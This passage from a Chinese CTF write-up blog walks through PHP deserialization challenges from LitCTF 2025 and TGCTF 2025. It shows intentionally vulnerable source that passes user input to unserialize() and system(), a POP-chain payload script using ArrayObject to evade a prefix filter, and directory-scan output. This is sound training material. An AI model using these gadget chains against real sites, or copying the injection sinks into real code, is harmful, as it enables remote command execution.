class="hljs-variable">$magic</span>;  <span class="hljs-comment">// 私有属性</span><br>    <br>    <span class="hljs-comment">// __unserialize魔术方法，在反序列化时调用</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;musubi = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;musubi&#x27;</span>]; <span class="hljs-comment">// 从数组中设置musubi属性</span><br>        <span class="hljs-variable language_">$this</span>-&gt;magic = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;magic&#x27;</span>];   <span class="hljs-comment">// 从数组中设置magic属性</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;musubi)();       <span class="hljs-comment">// 调用musubi属性（假设它是可调用的）</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// __call魔术方法，当调用不存在的方法时触发</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-comment">// 动态创建对象并调用方法</span><br>        (<span class="hljs-keyword">new</span> <span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$args</span>[<span class="hljs-number">1</span>]))-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;magic&#125;();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 定义Mitsuha类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mitsuha</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$memory</span>;  <span class="hljs-comment">// 私有属性</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$thread</span>;  <span class="hljs-comment">// 私有属性</span><br>    <br>    <span class="hljs-comment">// __invoke魔术方法，当对象被当作函数调用时触发</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// 返回两个属性的连接</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;memory.<span class="hljs-variable language_">$this</span>-&gt;thread;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 定义KatawareDoki类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KatawareDoki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$soul</span>;           <span class="hljs-comment">// 私有属性</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$kuchikamizake</span>;  <span class="hljs-comment">// 私有属性</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;          <span class="hljs-comment">// 私有属性</span><br>    <br>    <span class="hljs-comment">// __toString魔术方法，当对象被当作字符串使用时触发</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// 调用soul对象的flag方法</span><br>        (<span class="hljs-variable language_">$this</span>-&gt;soul)-&gt;<span class="hljs-title function_ invoke__">flag</span>(<span class="hljs-variable">$this</span>-&gt;kuchikamizake,<span class="hljs-variable">$this</span>-&gt;name);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;call error!no flag!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 从POST请求中获取Litctf2025参数</span><br><span class="hljs-variable">$Litctf2025</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Litctf2025&#x27;</span>];<br><span class="hljs-comment">// 检查参数是否以&quot;O:&quot;或&quot;a:&quot;开头并跟着数字</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="hljs-variable">$Litctf2025</span>))&#123;<br>    <span class="hljs-comment">// 如果不匹配，则反序列化该参数</span><br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Litctf2025</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// 如果匹配，输出提示信息</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;把O改成C不就行了吗,笨蛋!～(∠・ω&lt; )⌒☆&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>反序列化，看看ai怎么说  </p><p>ai没用，但是找到了出题人的wp   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Taki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$musubi</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$magic</span> = <span class="hljs-string">&quot;invoke&quot;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mitsuha</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$memory</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$thread</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KatawareDoki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$soul</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$kuchikamizake</span> = <span class="hljs-string">&quot;ReflectionFunction&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;\000lambda_1&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Taki</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Mitsuha</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">KatawareDoki</span>();<br><br><span class="hljs-variable">$a</span>-&gt;musubi = <span class="hljs-variable">$b</span>;<span class="hljs-comment">// 1.把对象当成函数调用，触发__invoke()</span><br><span class="hljs-variable">$b</span>-&gt;thread = <span class="hljs-variable">$c</span>;<span class="hljs-comment">// 2. 把对象作为字符串使用，触发__toString()</span><br><span class="hljs-variable">$c</span>-&gt;soul = <span class="hljs-variable">$a</span>;<span class="hljs-comment">// 3. 调用不存在的方法，触发__call()</span><br><br><span class="hljs-variable">$arr</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;evil&quot;</span>=&gt;<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>(<span class="hljs-variable">$arr</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$d</span>));<br></code></pre></td></tr></table></figure><p>有没见过的知识点<br>其中是要调用一个匿名函数，还有是使用arrayobject类型来反序列化出C开头的payload来绕过</p><h1 id="TGCTF-2025"><a href="#TGCTF-2025" class="headerlink" title="TGCTF 2025"></a>TGCTF 2025</h1><h2 id="什么文件上传？"><a href="#什么文件上传？" class="headerlink" title="什么文件上传？"></a>什么文件上传？</h2><p>好像上传啥都回显 hacker  </p><p>浅浅扫一下目录  </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[23:39:02]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /assets/<br><span class="hljs-selector-attr">[23:39:02]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">162</span>B  - /assets  -&gt;  http:<span class="hljs-comment">//127.0.0.1/assets/</span><br><span class="hljs-selector-attr">[23:39:04]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">162</span>B  - /css  -&gt;  http:<span class="hljs-comment">//127.0.0.1/css/</span><br><span class="hljs-selector-attr">[23:39:15]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">239</span>B  - /robots<span class="hljs-selector-class">.txt</span><br><span class="hljs-selector-attr">[23:39:19]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /upload<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[23:39:19]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /uploads/<br><span class="hljs-selector-attr">[23:39:19]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">162</span>B  - /uploads  -&gt;  http:<span class="hljs-comment">//127.0.0.1/uploads/</span><br></code></pre></td></tr></table></figure><p>原来前端里已经提示：机器人是啥？<br>在暗示有robots了  </p><p>robots:</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">User-Agent:</span> <span class="hljs-operator">*</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>admin<span class="hljs-symbol">/</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>private<span class="hljs-symbol">/</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-symbol">/baidu</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>s<span class="hljs-operator">?</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-symbol">/unlink</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-symbol">/phar</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">!</span>@<span class="hljs-operator">*</span>($^&amp;<span class="hljs-operator">*</span><span class="hljs-operator">!</span>@^&amp;<span class="hljs-operator">!</span><span class="hljs-operator">*</span>(@$<span class="hljs-comment"># &lt;--!文件上传后缀是三个小写字母 !@#$*&amp;^(!%@#$#^&amp;!--&gt;</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>class.php<br></code></pre></td></tr></table></figure><p>只有class.php 能连上<br>怎么是反序列化？  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">best64_decode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$str</span>)))));<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">yesterday</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$learn</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$study</span>=<span class="hljs-string">&quot;study&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$try</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;learn = <span class="hljs-string">&quot;learn&lt;br&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You studied hard yesterday.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;study-&gt;<span class="hljs-title function_ invoke__">hard</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">today</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$doing</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$did</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$done</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;did = <span class="hljs-string">&quot;What you did makes you outstanding.&lt;br&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;done = <span class="hljs-string">&quot;And what you&#x27;ve done has given you a choice.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;done;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;doing))==<span class="hljs-number">666</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doing</span>();<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;doing-&gt;better;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">tommoraw</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$good</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$bad</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$soso</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;good=<span class="hljs-string">&quot;You&#x27;ll be good tommoraw!&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;good;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;bad=<span class="hljs-string">&quot;You&#x27;ll be bad tommoraw!&lt;br&gt;&quot;</span>;<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">future</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$impossible</span>=<span class="hljs-string">&quot;How can you get here?&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$out</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$no</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$useful1</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful2</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful3</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful4</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful5</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful6</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful7</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful8</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful9</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful10</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful11</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful12</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful13</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful14</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful15</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful16</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful17</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful18</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful19</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful20</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;out-&gt;useful7) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Seven is my lucky number&lt;br&gt;&quot;</span>;<br>                <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This is your future.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;wow&quot;</span>]);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;win&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;no = <span class="hljs-string">&quot;no&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;no;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Focus on the previous step!&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>],<span class="hljs-number">0</span>,-<span class="hljs-number">4</span>);<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">best64_decode</span>(<span class="hljs-variable">$data</span>));<br>    &#125;<br>    <span class="hljs-comment">// You learn yesterday, you choose today, can you get to your future?</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ai注释一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">// 显示当前文件的源代码</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-comment">// 关闭所有错误报告</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 定义一个多层base64解码的函数</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">best64_decode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// 对输入字符串进行5次base64解码</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$str</span>))));<br>    &#125;<br><br>    // 定义yesterday类<br>    <span class="hljs-keyword">class</span> yesterday &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$learn</span>;      // 公共属性learn<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$study</span>=<span class="hljs-string">&quot;study&quot;</span>;  // 公共属性study，默认值为<span class="hljs-string">&quot;study&quot;</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$try</span>;        // 公共属性<span class="hljs-keyword">try</span><br><br>        // 构造函数<br>        <span class="hljs-keyword">public</span> function <span class="hljs-title function_ invoke__">__construct</span>()<br>        &#123;<br>            // 初始化learn属性<br>            <span class="hljs-variable">$this</span>-&gt;learn = <span class="hljs-string">&quot;learn&lt;br&gt;&quot;</span>;<br>        &#125;<br><br>        // 析构函数<br>        <span class="hljs-keyword">public</span> function <span class="hljs-title function_ invoke__">__destruct</span>()<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You studied hard yesterday.&lt;br&gt;&quot;</span>;<br>            // 调用study对象的hard方法<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$this</span>-&gt;study-&gt;<span class="hljs-title function_ invoke__">hard</span>();<br>        &#125;<br>    &#125;<br><br>    // 定义today类<br>    <span class="hljs-keyword">class</span> today &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$doing</span>;  // 公共属性doing<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$did</span>;    // 公共属性did<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$done</span>;   // 公共属性done<br><br>        // 构造函数<br>        <span class="hljs-keyword">public</span> function <span class="hljs-title function_ invoke__">__construct</span>()&#123;<br>            // 初始化did属性<br>            <span class="hljs-variable">$this</span>-&gt;did = <span class="hljs-string">&quot;What you did makes you outstanding.&lt;br&gt;&quot;</span>;<br>        &#125;<br><br>        // 魔术方法：当调用不存在的方法时触发<br>        <span class="hljs-keyword">public</span> function <span class="hljs-title function_ invoke__">__call</span>(<span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span>)<br>        &#123;<br>            <span class="hljs-variable">$this</span>-&gt;done = <span class="hljs-string">&quot;And what you&#x27;ve done has given you a choice.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$this</span>-&gt;done;<br>            // 检查doing属性的双重MD5哈希是否等于<span class="hljs-number">666</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;doing))==<span class="hljs-number">666</span>)&#123;<br>                <span class="hljs-comment">// 调用doing属性作为函数</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doing</span>();<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">// 返回doing对象的better属性</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable 